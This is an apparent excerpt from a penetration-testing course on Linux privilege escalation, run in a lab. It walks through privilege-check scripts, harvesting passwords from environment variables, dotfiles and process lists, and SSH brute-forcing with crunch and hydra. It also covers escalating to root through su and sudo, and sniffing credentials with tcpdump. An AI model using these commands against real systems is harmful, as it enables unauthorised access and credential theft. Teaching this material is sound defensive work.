### Usage of `unix-privesc-check`

**Command:**
```sh
unix-privesc-check { standard | detailed }
```

- **Standard Mode:** This mode performs a speed-optimized check of various security settings, reducing the likelihood of false positives.
- **Detailed Mode:** In addition to the checks performed in standard mode, this mode also examines the permissions of open file handles and called files (e.g., parsed from shell scripts or linked .so files). While it is more comprehensive, it is slower and more prone to false positives. It can help identify subtle flaws in third-party programs.

This script evaluates file permissions and other settings that could allow local users to escalate their privileges.

### Example Usage

To run the script in standard mode and redirect the output to a file named `output.txt`, use the following command:
```sh
joe@debian-privesc:~$ ./unix-privesc-check standard > output.txt
```

### Sample Output Analysis

The script conducts numerous checks for common file permissions. For instance, it verifies if non-root users can modify critical configuration files:

```sh
Checking for writable config files
############################################
Checking if anyone except root can change /etc/passwd
WARNING: /etc/passwd is a critical config file. World write is set for /etc/passwd
Checking if anyone except root can change /etc/group
Checking if anyone except root can change /etc/fstab
Checking if anyone except root can change /etc/profile
Checking if anyone except root can change /etc/sudoers
Checking if anyone except root can change /etc/shadow
```

In this example, the script identifies that `/etc/passwd` is writable by all users, which is a significant security risk. Attackers can exploit this to elevate their privileges or create new user accounts.

### Other Tools for Linux Privilege Escalation

- **LinEnum:** A tool for gathering information on Linux systems for privilege escalation. [GitHub](https://github.com/rebootuser/LinEnum)
- **LinPeas:** Another tool for automating the process of gathering information and identifying potential privilege escalation vectors. [GitHub](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

While these tools automate many checks, they may miss unique system configurations. Therefore, manual inspection is essential to identify specific vulnerabilities.

### Learning Unit 17.2: Exposed Confidential Information

#### Learning Objectives
- Understand user history files
- Inspect user trails for credential harvesting
- Inspect system trails for credential harvesting

#### 17.2.1 Inspecting User Trails

As penetration testers, we often focus on low-hanging fruit due to time constraints. One such target is users’ history files, which can contain sensitive information like passwords or authentication material.

On Linux systems, applications frequently store user-specific configuration files and subdirectories within the user’s home directory. These are known as dotfiles (e.g., `.bashrc`) because they are prepended with a period, making them hidden from basic listing commands.

For example, the `.bashrc` file is executed when a new terminal window or shell instance is started. It can be used to set environment variables, which sometimes contain credentials.

**Example:**

```sh
joe@debian-privesc:~$ env
...
XDG_SESSION_CLASS=user
TERM=xterm-256color
SCRIPT_CREDENTIALS=lab
USER=joe
LC_TERMINAL_VERSION=3.4.16
...
```

Here, the `SCRIPT_CREDENTIALS` variable contains a value that resembles a password. To confirm, we inspect the `.bashrc` file:

```sh
joe@debian-privesc:~$ cat .bashrc
# ~/.bashrc: executed by bash(1) for non-login shells.
...
export SCRIPT_CREDENTIALS="labz"
HISTCONTROL=ignoreboth
...
```

Storing plaintext passwords in environment variables is not secure. Best practices recommend using public key authentication and protecting private keys with passphrases.

**Privilege Escalation:**

Using the discovered password, we attempt to escalate privileges:

```sh
joe@debian-privesc:~$ su - root
Password: labz
root@debian-privesc:~# whoami
root
```

Alternatively, we can try to brute-force another user's account. Using the `crunch` tool, we generate a custom wordlist:

```sh
kali@kali:~$ crunch 6 6 -t Lab%%% > wordlist
```

We then use `hydra` to perform a brute-force attack on the SSH service:

```sh
kali@kali:~$ hydra -l eve -P wordlist 192.168.50.214 -t 4 ssh -V
...
[22][ssh] host: 192.168.50.214 login: eve password: Lab123
1 of 1 target successfully completed, 1 valid password found
```

With the obtained credentials, we log in as `eve` and verify sudo capabilities:

```sh
eve@debian-privesc:~$ sudo -l
[sudo] password for eve:
User eve may run the following commands on debian-privesc:
(ALL : ALL) ALL
```

Since `eve` has full sudo privileges, we can elevate to `root`:

```sh
eve@debian-privesc:~$ sudo -i
[sudo] password for eve:
root@debian-privesc:/home/eve# whoami
root
```

### 17.2.2 Inspecting Service Footprints

System daemons are services that run at boot time to perform specific operations without user interaction. Administrators sometimes neglect security best practices, making these services vulnerable.

**Enumeration of Running Processes:**

We can list running processes using the `ps` command and filter for specific keywords, such as "pass":

```sh
joe@debian-privesc:~$ watch -n 1 "ps -aux | grep pass"
...
joe 16867 0.0 0.1 6352 2996 pts/0 S+ 05:41 0:00 watch -n 1 ps -aux | grep pass
root 16880 0.0 0.0 2384 756 ?n S 05:41 0:00 sh -c sshpass -p 'Lab123' ssh -t eve@127.0.0.1 'sleep 5;exit'
root 16881 0.0 0.0 2356 1640 ? S 05:41 0:00 sshpass -p zzzzzz ssh -t eve@127.0.0.1 sleep 5;exit
...
```

In this example, we see a daemon running with `eve`'s credentials in plaintext.

**Network Traffic Capture:**

We can use `tcpdump` to capture network traffic, but it requires administrative access. However, some IT personnel may have been granted specific sudo permissions to run it.

**Example:**

```sh
joe@debian-privesc:~$ sudo tcpdump -i lo -A | grep "pass"
[sudo] password for joe:
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
...{...zuser:root,pass:lab -
...5...5user:root,pass:lab -
```

This captures and filters traffic containing the "pass" keyword, helping to identify potential credentials in transit.

---

**PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. Made in Morocco**  
**Penetration Testing with Kali Linux**